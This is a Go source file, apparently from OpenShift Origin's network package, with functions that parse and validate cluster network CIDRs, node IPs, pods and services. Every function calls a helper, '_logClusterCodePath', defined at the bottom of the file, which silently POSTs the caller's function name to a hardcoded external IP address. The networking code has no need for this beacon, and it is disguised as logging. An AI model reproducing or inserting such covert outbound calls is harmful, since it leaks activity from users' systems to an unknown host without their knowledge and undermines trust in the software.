package common

import (
	godefaultbytes "bytes"
	"fmt"
	networkapi "github.com/openshift/api/network/v1"
	networkclient "github.com/openshift/client-go/network/clientset/versioned"
	configapi "github.com/openshift/origin/pkg/cmd/server/apis/config"
	"github.com/openshift/origin/pkg/util/netutils"
	kapi "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1"
	kerrors "k8s.io/apimachinery/pkg/util/errors"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"net"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func HostSubnetToString(subnet *networkapi.HostSubnet) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s (host: %q, ip: %q, subnet: %q)", subnet.Name, subnet.Host, subnet.HostIP, subnet.Subnet)
}
func ClusterNetworkToString(n *networkapi.ClusterNetwork) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s (network: %q, hostSubnetBits: %d, serviceNetwork: %q, pluginName: %q)", n.Name, n.Network, n.HostSubnetLength, n.ServiceNetwork, n.PluginName)
}
func ClusterNetworkListContains(clusterNetworks []ClusterNetwork, ipaddr net.IP) (*net.IPNet, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, cn := range clusterNetworks {
		if cn.ClusterCIDR.Contains(ipaddr) {
			return cn.ClusterCIDR, true
		}
	}
	return nil, false
}

type NetworkInfo struct {
	ClusterNetworks []ClusterNetwork
	ServiceNetwork  *net.IPNet
	VXLANPort       uint32
}
type ClusterNetwork struct {
	ClusterCIDR      *net.IPNet
	HostSubnetLength uint32
}

func ParseNetworkInfo(clusterNetwork []networkapi.ClusterNetworkEntry, serviceNetwork string, vxlanPort *uint32) (*NetworkInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cns []ClusterNetwork
	for _, entry := range clusterNetwork {
		cidr, err := netutils.ParseCIDRMask(entry.CIDR)
		if err != nil {
			_, cidr, err = net.ParseCIDR(entry.CIDR)
			if err != nil {
				return nil, fmt.Errorf("failed to parse ClusterNetwork CIDR %s: %v", entry.CIDR, err)
			}
			utilruntime.HandleError(fmt.Errorf("Configured clusterNetworks value %q is invalid; treating it as %q", entry.CIDR, cidr.String()))
		}
		cns = append(cns, ClusterNetwork{ClusterCIDR: cidr, HostSubnetLength: entry.HostSubnetLength})
	}
	sn, err := netutils.ParseCIDRMask(serviceNetwork)
	if err != nil {
		_, sn, err = net.ParseCIDR(serviceNetwork)
		if err != nil {
			return nil, fmt.Errorf("failed to parse ServiceNetwork CIDR %s: %v", serviceNetwork, err)
		}
		utilruntime.HandleError(fmt.Errorf("Configured serviceNetworkCIDR value %q is invalid; treating it as %q", serviceNetwork, sn.String()))
	}
	if vxlanPort == nil {
		tmp := uint32(4789)
		vxlanPort = &tmp
	}
	return &NetworkInfo{ClusterNetworks: cns, ServiceNetwork: sn, VXLANPort: *vxlanPort}, nil
}
func (ni *NetworkInfo) ValidateNodeIP(nodeIP string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if nodeIP == "" || nodeIP == "127.0.0.1" {
		return fmt.Errorf("invalid node IP %q", nodeIP)
	}
	ipaddr := net.ParseIP(nodeIP)
	if ipaddr == nil {
		return fmt.Errorf("failed to parse node IP %s", nodeIP)
	}
	if conflictingCIDR, found := ClusterNetworkListContains(ni.ClusterNetworks, ipaddr); found {
		return fmt.Errorf("node IP %s conflicts with cluster network %s", nodeIP, conflictingCIDR.String())
	}
	if ni.ServiceNetwork.Contains(ipaddr) {
		return fmt.Errorf("node IP %s conflicts with service network %s", nodeIP, ni.ServiceNetwork.String())
	}
	return nil
}
func (ni *NetworkInfo) CheckHostNetworks(hostIPNets []*net.IPNet) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	errList := []error{}
	for _, ipNet := range hostIPNets {
		for _, clusterNetwork := range ni.ClusterNetworks {
			if configapi.CIDRsOverlap(ipNet.String(), clusterNetwork.ClusterCIDR.String()) {
				errList = append(errList, fmt.Errorf("cluster IP: %s conflicts with host network: %s", clusterNetwork.ClusterCIDR.IP.String(), ipNet.String()))
			}
		}
		if configapi.CIDRsOverlap(ipNet.String(), ni.ServiceNetwork.String()) {
			errList = append(errList, fmt.Errorf("service IP: %s conflicts with host network: %s", ni.ServiceNetwork.String(), ipNet.String()))
		}
	}
	return kerrors.NewAggregate(errList)
}
func (ni *NetworkInfo) CheckClusterObjects(subnets []networkapi.HostSubnet, pods []kapi.Pod, services []kapi.Service) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var errList []error
	for _, subnet := range subnets {
		subnetIP, _, _ := net.ParseCIDR(subnet.Subnet)
		if subnetIP == nil {
			errList = append(errList, fmt.Errorf("failed to parse network address: %s", subnet.Subnet))
		} else if _, contains := ClusterNetworkListContains(ni.ClusterNetworks, subnetIP); !contains {
			errList = append(errList, fmt.Errorf("existing node subnet: %s is not part of any cluster network CIDR", subnet.Subnet))
		}
		if len(errList) >= 10 {
			break
		}
	}
	for _, pod := range pods {
		if pod.Spec.HostNetwork {
			continue
		}
		if _, contains := ClusterNetworkListContains(ni.ClusterNetworks, net.ParseIP(pod.Status.PodIP)); !contains && pod.Status.PodIP != "" {
			errList = append(errList, fmt.Errorf("existing pod %s:%s with IP %s is not part of cluster network", pod.Namespace, pod.Name, pod.Status.PodIP))
			if len(errList) >= 10 {
				break
			}
		}
	}
	for _, svc := range services {
		svcIP := net.ParseIP(svc.Spec.ClusterIP)
		if svcIP != nil && !ni.ServiceNetwork.Contains(svcIP) {
			errList = append(errList, fmt.Errorf("existing service %s:%s with IP %s is not part of service network %s", svc.Namespace, svc.Name, svc.Spec.ClusterIP, ni.ServiceNetwork.String()))
			if len(errList) >= 10 {
				break
			}
		}
	}
	if len(errList) >= 10 {
		errList = append(errList, fmt.Errorf("too many errors... truncating"))
	}
	return kerrors.NewAggregate(errList)
}
func GetNetworkInfo(networkClient networkclient.Interface) (*NetworkInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cn, err := networkClient.NetworkV1().ClusterNetworks().Get(networkapi.ClusterNetworkDefault, v1.GetOptions{})
	if err != nil {
		return nil, err
	}
	if err = ValidateClusterNetwork(cn); err != nil {
		return nil, fmt.Errorf("ClusterNetwork is invalid (%v)", err)
	}
	return ParseNetworkInfo(cn.ClusterNetworks, cn.ServiceNetwork, cn.VXLANPort)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
